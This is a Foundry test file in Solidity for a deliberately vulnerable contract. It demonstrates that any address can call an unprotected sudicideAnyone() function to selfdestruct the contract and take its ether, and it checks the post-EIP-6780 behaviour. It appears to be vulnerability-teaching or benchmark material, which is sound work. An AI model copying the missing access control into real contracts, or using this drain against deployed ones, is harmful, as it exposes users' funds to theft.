// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_suicide.sol";

contract SimpleSuicideTest is Test {
    SimpleSuicide simpleSuicide;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.prank(owner);
        simpleSuicide = new SimpleSuicide();
    }

    function testAnyoneCanSelfDestruct() public {
        // Deposit some funds into the contract by sending to owner first
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        simpleSuicide.deposit{value: 5 ether}();

        // Verify contract balance before attack
        uint256 initialBalance = simpleSuicide.getContractBalance();
        assertEq(initialBalance, 5 ether);

        // Record attacker balance before attack
        uint256 attackerInitialBalance = attacker.balance;

        // Attacker calls sudicideAnyone() without any restrictions
        vm.prank(attacker);
        simpleSuicide.sudicideAnyone();

        // Verify contract balance is zero after destruction
        assertEq(address(simpleSuicide).balance, 0);

        // Verify attacker received the funds
        assertEq(attacker.balance, attackerInitialBalance + initialBalance);
    }

    function testContractStillExistsAfterDestruction() public {
        // Deposit some funds first
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        simpleSuicide.deposit{value: 1 ether}();

        // Attacker destroys contract
        vm.prank(attacker);
        simpleSuicide.sudicideAnyone();

        // Verify contract still exists (due to EIP-6780 changes)
        uint256 codeSize = address(simpleSuicide).code.length;
        assertGt(codeSize, 0);
    }
}
